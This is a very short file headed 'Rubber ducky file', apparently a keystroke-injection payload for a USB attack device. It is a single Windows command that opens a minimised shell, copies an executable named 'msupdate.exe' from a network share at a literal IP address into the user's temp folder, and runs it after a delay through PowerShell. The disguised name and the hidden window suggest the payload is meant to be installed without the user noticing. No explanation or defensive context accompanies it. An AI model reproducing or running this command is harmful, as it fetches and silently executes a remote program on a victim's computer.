# Rubber ducky file.
C:\Windows\System32\cmd.exe /c start /min cmd /c "pushd \\5.200.18.86\download & copy msupdate.exe %userprofile%\appdata\local\temp & popd" & powershell.exe -c "start-sleep -s 10;%LOCALAPPDATA%\temp\msupdate.exe"
